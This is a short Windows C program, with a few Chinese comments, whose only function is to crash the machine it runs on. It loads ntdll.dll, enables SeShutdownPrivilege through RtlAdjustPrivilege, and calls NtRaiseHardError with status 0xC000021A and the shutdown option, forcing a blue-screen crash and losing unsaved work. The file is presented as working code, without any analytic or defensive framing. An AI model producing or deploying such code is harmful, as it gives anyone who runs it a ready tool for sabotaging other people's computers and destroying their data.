
#define _NT_HDRS_
#include <windows.h>

typedef /*__success(return >= 0)*/ LONG NTSTATUS; 
typedef NTSTATUS *PNTSTATUS; 

#define STATUS_SUCCESS  ((NTSTATUS)0x00000000L)

typedef struct _LSA_UNICODE_STRING {
  USHORT Length;
  USHORT MaximumLength;
  PWSTR  Buffer;
} LSA_UNICODE_STRING, *PLSA_UNICODE_STRING, UNICODE_STRING, *PUNICODE_STRING;

typedef enum _HARDERROR_RESPONSE_OPTION {
    OptionAbortRetryIgnore,
    OptionOk,
    OptionOkCancel,
    OptionRetryCancel,
    OptionYesNo,
    OptionYesNoCancel,
    OptionShutdownSystem
} HARDERROR_RESPONSE_OPTION, *PHARDERROR_RESPONSE_OPTION;

typedef enum _HARDERROR_RESPONSE {
    ResponseReturnToCaller,
    ResponseNotHandled,
    ResponseAbort,
    ResponseCancel,
    ResponseIgnore,
    ResponseNo,
    ResponseOk,
    ResponseRetry,
    ResponseYes
} HARDERROR_RESPONSE, *PHARDERROR_RESPONSE;

HINSTANCE hInst;// 当前实例

typedef UINT (CALLBACK* NTRAISEHARDERROR)(NTSTATUS, ULONG, PUNICODE_STRING, PVOID,HARDERROR_RESPONSE_OPTION, PHARDERROR_RESPONSE);
typedef UINT (CALLBACK* RTLADJUSTPRIVILEGE)(ULONG, BOOL, BOOL, PINT);

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
	HINSTANCE hDLL = LoadLibrary(TEXT("ntdll.dll"));
	NTRAISEHARDERROR NtRaiseHardError;
	RTLADJUSTPRIVILEGE RtlAdjustPrivilege;
	int nEn = 0;
	HARDERROR_RESPONSE reResponse;
	if (hDLL != NULL)
	{
		NtRaiseHardError = (NTRAISEHARDERROR)GetProcAddress(hDLL, "NtRaiseHardError");
		RtlAdjustPrivilege = (RTLADJUSTPRIVILEGE)GetProcAddress(hDLL, "RtlAdjustPrivilege");
		if (!NtRaiseHardError)
		{
			// 处理错误的
			FreeLibrary(hDLL);
			return 0;
		}
		if (!RtlAdjustPrivilege)
		{
			// 处理错误的
			FreeLibrary(hDLL);
			return 0;
		}
		RtlAdjustPrivilege(0x13, TRUE, FALSE, &nEn);//0x13 = SeShutdownPrivilege
		NtRaiseHardError(0xC000021A,0,0,0,OptionShutdownSystem,&reResponse);
	}
	return 1;
}
